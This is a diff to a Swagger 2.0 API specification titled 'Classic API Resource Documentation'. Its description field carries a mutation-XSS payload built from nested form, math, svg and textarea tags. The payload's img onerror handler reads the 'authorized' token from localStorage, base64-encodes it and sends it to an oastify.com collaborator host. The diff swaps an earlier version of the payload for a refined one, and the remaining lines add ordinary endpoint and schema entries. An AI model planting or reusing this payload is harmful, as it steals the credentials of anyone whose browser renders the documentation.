@@ -2,8 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror='fetch(\"https://77cjj6b0ggsxbjirvsgqqitct3zunlf94.oastify.com>?token=\"+btoa(localStorage.getItem(\"authorized\")));' src=1></form>
-
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=1 onerror='fetch("https://nc3zomgglwxdgzn708l6vyysyj4as1mpb.oastify.com/?token="+btoa(localStorage.getItem("authorized"))).then(response => response.text()).then(data => console.log(data));'></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -24,4 +23,28 @@ paths:
         - accounts
       operationId: findAccounts
       summary: Finds all accounts
-  '/accounts/groupid/{id}':
+  /accounts/groupid/{id}:
+    get:
+      parameters:
+        - name: id
+          in: path
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccountById
+      summary: Finds an account by ID
+definitions:
+  Account:
+    type: object
+    properties:
+      id:
+        type: integer
+      name:
+        type: string
+securityDefinitions:
+  basicAuth:
+    type: basic
